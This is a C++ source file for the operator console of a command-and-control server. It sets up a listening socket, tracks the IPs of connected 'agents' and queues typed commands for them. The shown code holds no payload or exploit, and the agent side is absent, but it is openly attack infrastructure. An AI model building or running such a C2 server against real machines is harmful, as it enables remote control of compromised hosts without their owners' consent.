#include <csignal>
#include <iostream>
#include <stdexcept>
#include <string>
#include <mutex>
#include <queue>
#include <thread>
#include <atomic>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "server.h"

using namespace std;

// this handles the operator shell
void main_handler(atomic<bool>& running, int port)
{
    while (running)
    {
        string command{};

        cout << "[c2-tool] > " << flush;
        getline(cin, command);

        if (command == "help")
        {
            cout << endl;
            cout << "This is a C2 Server. Issue commands to binded agents." << endl;
            cout << "'status' to check previously connected agents and running." << endl;
            cout << "'history' to check previously connected agents and running." << endl;
            cout << "Type 'help' to display this menu." << endl;
            cout << "'exit' to close the program." << endl;
            cout << endl;
        }

        else if (command == "status")
        {
            cout << endl;
            cout << "Server Running on Port: " << port << endl;
            cout << "Previously Connected Agents are: " << endl;
            {
                lock_guard<mutex> guard(server.deadlock);
                for (const auto& element : server.seenIPs)
                {
                    cout << element << endl;
                }
            }
            cout << endl;
        }

        else if (command == "history")
        {
            cout << endl;
            cout << "History of Commands Sent: " << endl;
            {
                lock_guard<mutex> guard(server.deadlock);
                for (const auto& element : server.history)
                {
                    cout << element << endl;
                }
            }
            cout << endl;
        }

        else if (command == "exit")
        {
            cout << "Exiting..." << endl;
            running = false;
        }

        else
        {
            // this is all other commands -- presumably meant for an agent
            {
                lock_guard<mutex> guard(server.deadlock);
                server.commands.push(command);
                server.history.push_back(command);
            }
        }
    }
}

void closeSocket(int sig)
{
    server.running = false;
    close(server.sockfd);
}

int main(int argc, char* argv[])
{
    int port{};

    if (argc > 1)
    {
        try {
            port = stoi(argv[1]);
        } catch (const invalid_argument& problem) {
            cout << problem.what() << endl;
            return -1;
        } catch (const out_of_range& problem) {
            cout << problem.what() << endl;
            return -1;
        }
    }

    else
    {
        cout << "No Port Argument Passed (e.g., ./client 1234). Launching Interactive Mode." << endl;
        cout << "Provide Listening Port: ";
        cin >> port;
        cin.ignore();
    }

    server.sockfd = server_setup(port);

    if (server.sockfd == -1)
    {
        cout << "\nServer setup failed. Exiting." << endl;
        return 1;
    }

    // this is so that we shutdown gracefully if interrupted by Ctrl+C (SIGINT) or a kill command (SIGTERM)
    signal(SIGINT, closeSocket);
    signal(SIGTERM, closeSocket);

    thread connectionThread(connection_handler, server.sockfd, ref(server.running));
    thread mainThread(main_handler, ref(server.running), port);

    // wait here
    connectionThread.join();
    mainThread.join();
}